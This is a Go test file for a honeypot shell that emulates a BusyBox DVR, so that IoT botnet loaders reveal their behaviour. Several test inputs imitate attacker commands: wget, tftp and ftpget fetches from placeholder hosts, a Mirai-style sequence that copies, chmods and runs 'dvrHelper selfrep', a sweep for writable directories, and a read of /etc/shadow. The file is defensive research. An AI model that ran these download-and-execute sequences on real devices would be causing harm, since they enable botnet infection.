package shell

import (
	"strings"
	"testing"
)

// The telnet sensor is a HiSilicon Hi3520DV400 DVR (Cortex-A7, BusyBox ash).
// 579 of ~630 logged-in telnet IPs open with device-console words
// (enable/system/shell), and loaders pick a payload from uname and ELF
// headers, so every surface must agree on one embedded ARM device.

func newDVR() *Interpreter { return NewInterpreterFor("admin", DVR) }

func TestDVRIdentity(t *testing.T) {
	s := newDVR()
	for line, want := range map[string]string{
		"uname -a": "Linux LocalHost 3.10.0 #1 SMP Thu Mar 8 15:40:28 CST 2018 armv7l GNU/Linux",
		"uname -m": "armv7l",
		"hostname": "LocalHost",
		"whoami":   "root",
		"pwd":      "/",
		"id":       "uid=0(root) gid=0(root) groups=0(root)",
	} {
		if out, _, _ := s.Run(line); out != want {
			t.Errorf("%s = %q, want %q", line, out, want)
		}
	}
	if p := s.Prompt(); p != "# " {
		t.Errorf("prompt = %q, want \"# \"", p)
	}
}

func TestDVRShellErrorsAreAsh(t *testing.T) {
	s := newDVR()
	for line, want := range map[string]string{
		"enable":           "-sh: enable: not found",
		"linuxshell":       "-sh: linuxshell: not found",
		"do":               `-sh: syntax error: unexpected "do"`,
		"echo x > /nope/f": "-sh: can't create /nope/f: nonexistent directory",
		"./missing":        "-sh: ./missing: not found",
	} {
		if out, _, _ := s.Run(line); out != want {
			t.Errorf("%q -> %q, want %q", line, out, want)
		}
	}
}

func TestDVRConsoleWordsLikeBusybox(t *testing.T) {
	s := newDVR()
	if out, code, _ := s.Run("su"); out != "" || code != 0 {
		t.Errorf("su (already root) -> (%q, %d), want silent success", out, code)
	}
	out, code, _ := s.Run("ping")
	if code != 1 || !strings.HasPrefix(out, "BusyBox v1.20.2") || !strings.Contains(out, "Usage: ping") {
		t.Errorf("ping -> (%q, %d), want BusyBox usage, exit 1", out, code)
	}
	if out, _, _ := s.Run("/bin/busybox"); !strings.HasPrefix(out, "BusyBox v1.20.2 (2018-03-08 15:32:11 CST) multi-call binary.") {
		t.Errorf("busybox banner = %q", firstLine(out))
	}
}

func TestDVRHostnameCanBeSet(t *testing.T) {
	s := newDVR()
	if out, code, _ := s.Run("/bin/busybox hostname PBOC"); out != "" || code != 0 {
		t.Errorf("hostname PBOC -> (%q, %d), want silent success", out, code)
	}
	if out, _, _ := s.Run("hostname"); out != "PBOC" {
		t.Errorf("hostname after set = %q, want PBOC", out)
	}
}

func TestDVRProcFilesDescribeTheSameARMDevice(t *testing.T) {
	s := newDVR()
	checks := map[string][]string{
		"cat /proc/cpuinfo": {"ARMv7 Processor rev 5 (v7l)", "CPU part\t: 0xc07", "hi3520dv400"},
		"cat /proc/version": {"Linux version 3.10.0", "Thu Mar 8 15:40:28 CST 2018"},
		"cat /proc/mounts":  {"rootfs / squashfs ro", "tmpfs /var tmpfs rw", "tmpfs /dev/shm tmpfs rw"},
		"ps":                {"  PID USER       VSZ STAT COMMAND", "Sofia", "telnetd"},
	}
	for line, wants := range checks {
		out, _, _ := s.Run(line)
		for _, w := range wants {
			if !strings.Contains(out, w) {
				t.Errorf("%s missing %q:\n%s", line, w, out)
			}
		}
	}
}

func TestDVRELFHeaderIsARM32(t *testing.T) {
	s := newDVR()
	out, code, _ := s.Run("dd bs=52 count=1 if=/bin/ls")
	if code != 0 || out[:52] != elf32ARMHeader {
		t.Fatalf("dd header = %q (exit %d)", out, code)
	}
	// EI_CLASS=1 (32-bit), EI_DATA=1 (LE), e_machine=0x28 (ARM), EABI5.
	h := elf32ARMHeader
	if h[4] != 1 || h[5] != 1 || h[18] != 0x28 || h[39] != 0x05 || len(h) != 52 {
		t.Errorf("header fields wrong: % x", h)
	}
}

func TestDVRShadowIsStillBait(t *testing.T) {
	s := newDVR()
	_, _, bait := s.Run("cat /etc/shadow")
	if len(bait) != 1 || bait[0].BaitID != "etc-shadow" {
		t.Errorf("bait = %+v, want one etc-shadow hit", bait)
	}
}

func TestDVRShowsNoUbuntuTraces(t *testing.T) {
	s := newDVR()
	for _, line := range []string{
		"uname -a", "cat /proc/version", "cat /proc/cpuinfo", "ls /", "ls /home",
		"ps", "id", "hostname", "/bin/busybox", "cat /etc/passwd", "ping", "ls /bin",
	} {
		out, _, _ := s.Run(line)
		low := strings.ToLower(out)
		for _, tell := range []string{"ubuntu", "aws", "x86", "intel", "bash", "nginx", "gunicorn"} {
			if strings.Contains(low, tell) {
				t.Errorf("%q leaks %q: %q", line, tell, firstLine(out))
			}
		}
	}
	if _, code, _ := s.Run("cat /etc/os-release"); code == 0 {
		t.Error("/etc/os-release exists on the DVR")
	}
}

func TestUbuntuProfileHasNoBusybox(t *testing.T) {
	s := NewInterpreter("root")
	if out, code, _ := s.Run("cat /bin/busybox"); code != 1 || !strings.Contains(out, "No such file") {
		t.Errorf("SSH: cat /bin/busybox -> (%q, %d), want not found", out, code)
	}
}

func firstLine(s string) string {
	line, _, _ := strings.Cut(s, "\r\n")
	return line
}

// The rootfs is read-only squashfs; only the tmpfs and jffs2 mounts listed
// in /proc/mounts take writes. Bots sweep `>/DIR/.x && cd /DIR/` to find
// one, so which directories accept a write decides where they land.
func TestDVRWritableDirSweep(t *testing.T) {
	writable := map[string]bool{
		"/tmp": true, "/var": true, "/dev": true, "/var/run": true, "/var/tmp": true,
		"/dev/shm": true, "/mnt/mtd": true,
		"/mnt": false, "/": false, "/bin": false, "/etc": false, "/usr": false, "/root": false,
	}
	for dir, ok := range writable {
		s := newDVR()
		target := strings.TrimSuffix(dir, "/") + "/.ptmx"
		out, code, _ := s.Run(">" + target + " && cd " + dir)
		cwd, _, _ := s.Run("pwd")
		if ok && (code != 0 || cwd != dir) {
			t.Errorf("%s should be writable: (%q, %d), cwd %q", dir, out, code, cwd)
		}
		if !ok && (out != "-sh: can't create "+target+": Read-only file system" || code == 0 || cwd != "/") {
			t.Errorf("%s should be read-only: (%q, %d), cwd %q", dir, out, code, cwd)
		}
	}
}

func TestDVRReadOnlyErrorsPerCommand(t *testing.T) {
	s := newDVR()
	for line, want := range map[string]string{
		"touch /usr/x":           "touch: /usr/x: Read-only file system",
		"mkdir /etc/x":           "mkdir: can't create directory '/etc/x': Read-only file system",
		"rm /bin/ls":             "rm: can't remove '/bin/ls': Read-only file system",
		"cp /bin/busybox /usr/x": "cp: can't create '/usr/x': Read-only file system",
		"chmod 777 /bin/ls":      "chmod: /bin/ls: Read-only file system",
		"cp /bin/busybox /tmp/y; chmod 777 /tmp/y; rm /tmp/y": "",
	} {
		if out, _, _ := s.Run(line); out != want {
			t.Errorf("%q -> %q, want %q", line, out, want)
		}
	}
	if _, code, _ := s.Run("ls /bin/ls"); code != 0 {
		t.Error("rm on the read-only rootfs removed /bin/ls")
	}
}

func TestUbuntuRootfsStaysWritable(t *testing.T) {
	s := NewInterpreter("root")
	if out, code, _ := s.Run("echo x > /usr/x && cat /usr/x"); !strings.HasPrefix(out, "x") || code != 0 {
		t.Errorf("SSH write to /usr -> (%q, %d), want unchanged behaviour", out, code)
	}
}

// `> FILE` with no command creates or truncates FILE; the writable-dir
// sweep depends on it failing on a read-only mount and succeeding elsewhere.
func TestBareRedirectCreatesFile(t *testing.T) {
	for name, s := range map[string]*Interpreter{"ubuntu": NewInterpreter("root"), "dvr": newDVR()} {
		if out, code, _ := s.Run(">/tmp/.x"); out != "" || code != 0 {
			t.Errorf("%s: >/tmp/.x -> (%q, %d)", name, out, code)
		}
		if out, _, _ := s.Run("ls -a /tmp"); !strings.Contains(out, ".x") {
			t.Errorf("%s: ls -a /tmp = %q, want .x created", name, out)
		}
	}
}

func TestLsOnAFileNamesIt(t *testing.T) {
	for name, s := range map[string]*Interpreter{"ubuntu": NewInterpreter("root"), "dvr": newDVR()} {
		if out, code, _ := s.Run("ls /bin/ls"); out != "/bin/ls" || code != 0 {
			t.Errorf("%s: ls /bin/ls -> (%q, %d)", name, out, code)
		}
		if out, _, _ := s.Run("ls -l /bin/ls"); !strings.HasSuffix(out, " /bin/ls") || strings.HasPrefix(out, "total") {
			t.Errorf("%s: ls -l /bin/ls = %q", name, out)
		}
	}
}

// SECURITY.md: a download is never reported as successful. On the DVR the
// BusyBox downloaders fail like a box with no route out, which also sends
// Mirai loaders on to their echo fallback, the one that delivers the binary.
func TestDVRDownloadersFailWithoutEgress(t *testing.T) {
	s := newDVR()
	for line, want := range map[string]string{
		"wget http://198.51.100.7/x.sh":                "Connecting to 198.51.100.7 (198.51.100.7:80)\r\nwget: can't connect to remote host (198.51.100.7): Connection timed out",
		"/bin/busybox wget http://198.51.100.7:8080/a": "Connecting to 198.51.100.7:8080 (198.51.100.7:8080)\r\nwget: can't connect to remote host (198.51.100.7): Connection timed out",
		"busybox wget http://loader.example/b":         "wget: bad address 'loader.example'",
		"tftp -g -r m 198.51.100.7":                    "tftp: timeout",
		"/bin/busybox tftp -g 198.51.100.7 -r t -l-":   "tftp: timeout",
		"ftpget 198.51.100.7 f ftpget":                 "ftpget: can't connect to remote host (198.51.100.7): Connection timed out",
	} {
		out, code, _ := s.Run(line)
		if out != want || code != 1 {
			t.Errorf("%q -> (%q, %d), want (%q, 1)", line, out, code, want)
		}
	}
	if out, _, _ := s.Run("ls /bin"); !strings.Contains(out, "wget") || !strings.Contains(out, "tftp") {
		t.Errorf("ls /bin = %q, want the downloaders listed", out)
	}
}

// Through /bin/busybox, file applets must do what the plain commands do;
// they used to succeed without touching anything.
func TestDVRBusyboxFileAppletsAreReal(t *testing.T) {
	s := newDVR()
	s.Run("cd /tmp")
	for line, want := range map[string]string{
		"/bin/busybox cp /bin/busybox /usr/x":                       "cp: can't create '/usr/x': Read-only file system",
		"/bin/busybox cp /bin/busybox dvrHelper; ls dvrHelper":      "dvrHelper",
		"/bin/busybox touch .d; /bin/busybox chmod +x .d; ls -l .d": "-rwx",
		"/bin/busybox mkdir q; /bin/busybox rm -r q; ls q":          "ls: cannot access 'q': No such file or directory",
	} {
		if out, _, _ := s.Run(line); !strings.HasPrefix(out, want) {
			t.Errorf("%q -> %q, want prefix %q", line, out, want)
		}
	}
}

// A dropped Mirai binary daemonises: the shell sees it exit 0 at once.
func TestDVRRunningAnELFExitsQuietly(t *testing.T) {
	s := newDVR()
	out, code, _ := s.Run("cd /tmp; cp /bin/busybox dvrHelper; chmod 777 dvrHelper; ./dvrHelper selfrep")
	if out != "" || code != 0 {
		t.Errorf("running an ELF -> (%q, %d), want (\"\", 0)", out, code)
	}
}
